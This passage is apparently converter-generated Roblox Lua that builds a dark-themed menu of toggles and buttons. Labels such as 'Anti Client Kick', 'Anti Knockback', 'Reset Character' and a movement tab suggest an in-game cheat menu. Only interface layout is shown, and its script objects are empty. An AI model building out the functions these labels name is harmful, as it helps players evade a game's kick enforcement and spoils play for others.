G2L["12b"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button.toggleFrame.outlineStroke
G2L["12c"] = Instance.new("UIStroke", G2L["129"]);
G2L["12c"]["Thickness"] = 2;
G2L["12c"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button.UIPadding
G2L["12d"] = Instance.new("UIPadding", G2L["128"]);
G2L["12d"]["PaddingTop"] = UDim.new(0, 3);
G2L["12d"]["PaddingRight"] = UDim.new(0, 3);
G2L["12d"]["PaddingLeft"] = UDim.new(0, 3);
G2L["12d"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.text
G2L["12e"] = Instance.new("TextLabel", G2L["127"]);
G2L["12e"]["TextWrapped"] = true;
G2L["12e"]["ZIndex"] = 10;
G2L["12e"]["BorderSizePixel"] = 0;
G2L["12e"]["TextSize"] = 14;
G2L["12e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["12e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12e"]["BackgroundTransparency"] = 1;
G2L["12e"]["Size"] = UDim2.new(0, 155, 0, 20);
G2L["12e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12e"]["Text"] = [[Anti Client Kick]];
G2L["12e"]["Name"] = [[text]];
G2L["12e"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.text.UIPadding
G2L["12f"] = Instance.new("UIPadding", G2L["12e"]);
G2L["12f"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.text.text
G2L["130"] = Instance.new("UIStroke", G2L["12e"]);
G2L["130"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.UIPadding
G2L["131"] = Instance.new("UIPadding", G2L["127"]);
G2L["131"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback
G2L["132"] = Instance.new("Frame", G2L["e1"]);
G2L["132"]["BorderSizePixel"] = 0;
G2L["132"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["132"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["132"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["132"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["132"]["Name"] = [[knockback]];
G2L["132"]["LayoutOrder"] = 4;
G2L["132"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button
G2L["133"] = Instance.new("TextButton", G2L["132"]);
G2L["133"]["BorderSizePixel"] = 0;
G2L["133"]["TextTransparency"] = 1;
G2L["133"]["TextSize"] = 14;
G2L["133"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["133"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["133"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["133"]["ZIndex"] = 50;
G2L["133"]["BackgroundTransparency"] = 1;
G2L["133"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["133"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["133"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button.toggleFrame
G2L["134"] = Instance.new("Frame", G2L["133"]);
G2L["134"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["134"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["134"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["134"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["134"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button.toggleFrame.toggleFade
G2L["135"] = Instance.new("CanvasGroup", G2L["134"]);
G2L["135"]["BorderSizePixel"] = 0;
G2L["135"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["135"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["135"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["135"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["135"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button.toggleFrame.toggleFade.UIGradient
G2L["136"] = Instance.new("UIGradient", G2L["135"]);
G2L["136"]["Rotation"] = 90;
G2L["136"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button.toggleFrame.outlineStroke
G2L["137"] = Instance.new("UIStroke", G2L["134"]);
G2L["137"]["Thickness"] = 2;
G2L["137"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button.UIPadding
G2L["138"] = Instance.new("UIPadding", G2L["133"]);
G2L["138"]["PaddingTop"] = UDim.new(0, 3);
G2L["138"]["PaddingRight"] = UDim.new(0, 3);
G2L["138"]["PaddingLeft"] = UDim.new(0, 3);
G2L["138"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.text
G2L["139"] = Instance.new("TextLabel", G2L["132"]);
G2L["139"]["TextWrapped"] = true;
G2L["139"]["ZIndex"] = 10;
G2L["139"]["BorderSizePixel"] = 0;
G2L["139"]["TextSize"] = 14;
G2L["139"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["139"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["139"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["139"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["139"]["BackgroundTransparency"] = 1;
G2L["139"]["Size"] = UDim2.new(0, 155, 0, 20);
G2L["139"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["139"]["Text"] = [[Anti Knockback]];
G2L["139"]["Name"] = [[text]];
G2L["139"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.text.UIPadding
G2L["13a"] = Instance.new("UIPadding", G2L["139"]);
G2L["13a"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.text.text
G2L["13b"] = Instance.new("UIStroke", G2L["139"]);
G2L["13b"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.UIPadding
G2L["13c"] = Instance.new("UIPadding", G2L["132"]);
G2L["13c"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======TITLE======
G2L["13d"] = Instance.new("Frame", G2L["e1"]);
G2L["13d"]["BorderSizePixel"] = 0;
G2L["13d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13d"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["13d"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["13d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13d"]["Name"] = [[======TITLE======]];
G2L["13d"]["LayoutOrder"] = 1;
G2L["13d"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======TITLE======.text
G2L["13e"] = Instance.new("TextLabel", G2L["13d"]);
G2L["13e"]["TextWrapped"] = true;
G2L["13e"]["BorderSizePixel"] = 0;
G2L["13e"]["TextSize"] = 14;
G2L["13e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["13e"]["TextTransparency"] = 0.3;
G2L["13e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["13e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13e"]["BackgroundTransparency"] = 1;
G2L["13e"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["13e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13e"]["Text"] = [[Anti]];
G2L["13e"]["Name"] = [[text]];
G2L["13e"]["Position"] = UDim2.new(0.02273, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======TITLE======.text.text
G2L["13f"] = Instance.new("UIStroke", G2L["13e"]);
G2L["13f"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======TITLE======.text.UIPadding
G2L["140"] = Instance.new("UIPadding", G2L["13e"]);
G2L["140"]["PaddingLeft"] = UDim.new(0, 1);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======TITLE======.minimise
G2L["141"] = Instance.new("TextButton", G2L["13d"]);
G2L["141"]["BorderSizePixel"] = 0;
G2L["141"]["TextTransparency"] = 0.3;
G2L["141"]["TextSize"] = 14;
G2L["141"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["141"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["141"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["141"]["BackgroundTransparency"] = 1;
G2L["141"]["Size"] = UDim2.new(0, 35, 1, 0);
G2L["141"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["141"]["Text"] = [[-]];
G2L["141"]["Name"] = [[minimise]];
G2L["141"]["Position"] = UDim2.new(1, -30, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside
G2L["142"] = Instance.new("Frame", G2L["de"]);
G2L["142"]["BorderSizePixel"] = 0;
G2L["142"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["142"]["Size"] = UDim2.new(0, 176, 0, 255);
G2L["142"]["Position"] = UDim2.new(-0.00038, 0, 0, 0);
G2L["142"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["142"]["Name"] = [[leftside]];
G2L["142"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab
G2L["143"] = Instance.new("Frame", G2L["142"]);
G2L["143"]["BorderSizePixel"] = 0;
G2L["143"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["143"]["Size"] = UDim2.new(0, 176, 0, 69);
G2L["143"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["143"]["Name"] = [[characterTab]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.characterScript
G2L["144"] = Instance.new("LocalScript", G2L["143"]);
G2L["144"]["Name"] = [[characterScript]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.UIListLayout
G2L["145"] = Instance.new("UIListLayout", G2L["143"]);
G2L["145"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["145"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======ACCENT======
G2L["146"] = Instance.new("Frame", G2L["143"]);
G2L["146"]["BorderSizePixel"] = 0;
G2L["146"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["146"]["Size"] = UDim2.new(1, 0, 0, 4);
G2L["146"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["146"]["Name"] = [[======ACCENT======]];
G2L["146"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======ACCENT======.GuiColor
G2L["147"] = Instance.new("Frame", G2L["146"]);
G2L["147"]["BorderSizePixel"] = 0;
G2L["147"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["147"]["Size"] = UDim2.new(1, -2, 0, 2);
G2L["147"]["Position"] = UDim2.new(0, 1, 0, 1);
G2L["147"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["147"]["Name"] = [[GuiColor]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======ACCENT======.GuiColor.UICorner
G2L["148"] = Instance.new("UICorner", G2L["147"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======TITLE======
G2L["149"] = Instance.new("Frame", G2L["143"]);
G2L["149"]["BorderSizePixel"] = 0;
G2L["149"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["149"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["149"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["149"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["149"]["Name"] = [[======TITLE======]];
G2L["149"]["LayoutOrder"] = 1;
G2L["149"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======TITLE======.text
G2L["14a"] = Instance.new("TextLabel", G2L["149"]);
G2L["14a"]["TextWrapped"] = true;
G2L["14a"]["BorderSizePixel"] = 0;
G2L["14a"]["TextSize"] = 14;
G2L["14a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["14a"]["TextTransparency"] = 0.3;
G2L["14a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14a"]["BackgroundTransparency"] = 1;
G2L["14a"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["14a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14a"]["Text"] = [[Character]];
G2L["14a"]["Name"] = [[text]];
G2L["14a"]["Position"] = UDim2.new(0.02273, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======TITLE======.text.text
G2L["14b"] = Instance.new("UIStroke", G2L["14a"]);
G2L["14b"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======TITLE======.text.UIPadding
G2L["14c"] = Instance.new("UIPadding", G2L["14a"]);
G2L["14c"]["PaddingLeft"] = UDim.new(0, 1);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======TITLE======.minimise
G2L["14d"] = Instance.new("TextButton", G2L["149"]);
G2L["14d"]["BorderSizePixel"] = 0;
G2L["14d"]["TextTransparency"] = 0.3;
G2L["14d"]["TextSize"] = 14;
G2L["14d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14d"]["BackgroundTransparency"] = 1;
G2L["14d"]["Size"] = UDim2.new(0, 35, 1, 0);
G2L["14d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14d"]["Text"] = [[-]];
G2L["14d"]["Name"] = [[minimise]];
G2L["14d"]["Position"] = UDim2.new(1, -30, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6
G2L["14e"] = Instance.new("Frame", G2L["143"]);
G2L["14e"]["BorderSizePixel"] = 0;
G2L["14e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14e"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["14e"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["14e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14e"]["Name"] = [[R6]];
G2L["14e"]["LayoutOrder"] = 2;
G2L["14e"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.button
G2L["14f"] = Instance.new("TextButton", G2L["14e"]);
G2L["14f"]["BorderSizePixel"] = 0;
G2L["14f"]["TextTransparency"] = 1;
G2L["14f"]["TextSize"] = 14;
G2L["14f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14f"]["ZIndex"] = 50;
G2L["14f"]["BackgroundTransparency"] = 1;
G2L["14f"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["14f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14f"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.button.toggleFrame
G2L["150"] = Instance.new("Frame", G2L["14f"]);
G2L["150"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["150"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["150"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["150"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["150"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.button.toggleFrame.toggleFade
G2L["151"] = Instance.new("CanvasGroup", G2L["150"]);
G2L["151"]["BorderSizePixel"] = 0;
G2L["151"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["151"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["151"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["151"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["151"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.button.toggleFrame.toggleFade.UIGradient
G2L["152"] = Instance.new("UIGradient", G2L["151"]);
G2L["152"]["Rotation"] = 90;
G2L["152"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.button.toggleFrame.outlineStroke
G2L["153"] = Instance.new("UIStroke", G2L["150"]);
G2L["153"]["Thickness"] = 2;
G2L["153"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.button.UIPadding
G2L["154"] = Instance.new("UIPadding", G2L["14f"]);
G2L["154"]["PaddingTop"] = UDim.new(0, 3);
G2L["154"]["PaddingRight"] = UDim.new(0, 3);
G2L["154"]["PaddingLeft"] = UDim.new(0, 3);
G2L["154"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.UIPadding
G2L["155"] = Instance.new("UIPadding", G2L["14e"]);
G2L["155"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.text
G2L["156"] = Instance.new("TextLabel", G2L["14e"]);
G2L["156"]["TextWrapped"] = true;
G2L["156"]["ZIndex"] = 10;
G2L["156"]["BorderSizePixel"] = 0;
G2L["156"]["TextSize"] = 14;
G2L["156"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["156"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["156"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["156"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["156"]["BackgroundTransparency"] = 1;
G2L["156"]["Size"] = UDim2.new(0, 155, 0, 20);
G2L["156"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["156"]["Text"] = [[R6]];
G2L["156"]["Name"] = [[text]];
G2L["156"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.text.UIPadding
G2L["157"] = Instance.new("UIPadding", G2L["156"]);
G2L["157"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.text.text
G2L["158"] = Instance.new("UIStroke", G2L["156"]);
G2L["158"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.greystroke
G2L["159"] = Instance.new("UIStroke", G2L["143"]);
G2L["159"]["ZIndex"] = 99;
G2L["159"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["159"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["159"]["Name"] = [[greystroke]];
G2L["159"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset
G2L["15a"] = Instance.new("Frame", G2L["143"]);
G2L["15a"]["BorderSizePixel"] = 0;
G2L["15a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15a"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["15a"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["15a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15a"]["Name"] = [[Reset]];
G2L["15a"]["LayoutOrder"] = 2;
G2L["15a"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button
G2L["15b"] = Instance.new("TextButton", G2L["15a"]);
G2L["15b"]["BorderSizePixel"] = 0;
G2L["15b"]["TextTransparency"] = 1;
G2L["15b"]["TextSize"] = 14;
G2L["15b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["15b"]["ZIndex"] = 49;
G2L["15b"]["BackgroundTransparency"] = 1;
G2L["15b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["15b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15b"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.UIPadding
G2L["15c"] = Instance.new("UIPadding", G2L["15b"]);
G2L["15c"]["PaddingTop"] = UDim.new(0, 2);
G2L["15c"]["PaddingRight"] = UDim.new(0, 3);
G2L["15c"]["PaddingLeft"] = UDim.new(0, 3);
G2L["15c"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.buttonFrame
G2L["15d"] = Instance.new("Frame", G2L["15b"]);
G2L["15d"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["15d"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["15d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["15d"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["15d"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.buttonFrame.outlineStroke
G2L["15e"] = Instance.new("UIStroke", G2L["15d"]);
G2L["15e"]["Thickness"] = 2;
G2L["15e"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.buttonFrame.buttonFade
G2L["15f"] = Instance.new("CanvasGroup", G2L["15d"]);
G2L["15f"]["BorderSizePixel"] = 0;
G2L["15f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15f"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["15f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15f"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.buttonFrame.buttonFade.UIGradient
G2L["160"] = Instance.new("UIGradient", G2L["15f"]);
G2L["160"]["Rotation"] = 90;
G2L["160"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.text
G2L["161"] = Instance.new("TextLabel", G2L["15b"]);
G2L["161"]["ZIndex"] = 2;
G2L["161"]["BorderSizePixel"] = 0;
G2L["161"]["TextSize"] = 14;
G2L["161"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["161"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["161"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["161"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["161"]["BackgroundTransparency"] = 1;
G2L["161"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["161"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["161"]["Text"] = [[Reset Character]];
G2L["161"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button.text.text
G2L["162"] = Instance.new("UIStroke", G2L["161"]);
G2L["162"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.fillbar
G2L["163"] = Instance.new("Frame", G2L["15a"]);
G2L["163"]["ZIndex"] = 90;
G2L["163"]["BorderSizePixel"] = 0;
G2L["163"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["163"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["163"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["163"]["Name"] = [[fillbar]];
G2L["163"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab
G2L["164"] = Instance.new("Frame", G2L["142"]);
G2L["164"]["BorderSizePixel"] = 0;
G2L["164"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["164"]["Size"] = UDim2.new(0, 176, 0, 103);
G2L["164"]["Position"] = UDim2.new(0, 0, 0.2902, 0);
G2L["164"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["164"]["Name"] = [[movementTab]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.movementScript
G2L["165"] = Instance.new("LocalScript", G2L["164"]);
G2L["165"]["Name"] = [[movementScript]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.UIListLayout
G2L["166"] = Instance.new("UIListLayout", G2L["164"]);
G2L["166"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["166"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.movementTab.greystroke
G2L["167"] = Instance.new("UIStroke", G2L["164"]);
G2L["167"]["ZIndex"] = 99;
G2L["167"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["167"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["167"]["Name"] = [[greystroke]];
G2L["167"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


